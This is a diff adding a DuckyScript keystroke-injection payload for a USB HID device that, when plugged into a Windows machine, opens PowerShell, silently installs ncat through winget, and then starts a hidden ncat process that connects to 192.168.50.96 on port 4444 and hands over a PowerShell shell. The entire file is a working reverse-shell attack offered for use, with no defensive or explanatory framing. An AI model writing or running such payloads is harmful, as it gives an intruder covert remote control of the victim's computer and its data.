@@ -1,0 +1,28 @@
+REM Reverse shell script using ncat!
+
+REM Downloading ncat
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 2000
+STRING winget install Insecure.nmap --force
+ENTER
+DELAY 60000
+LEFT
+ENTER
+DELAY 60000
+STRING exit
+ENTER
+
+REM Reverse Shell
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 2000
+STRING Start-Process -WindowStyle Hidden ncat -ArgumentList "192.168.50.96 4444 -e powershell.exe"
+ENTER
+DELAY 1000
+STRING exit
+ENTER
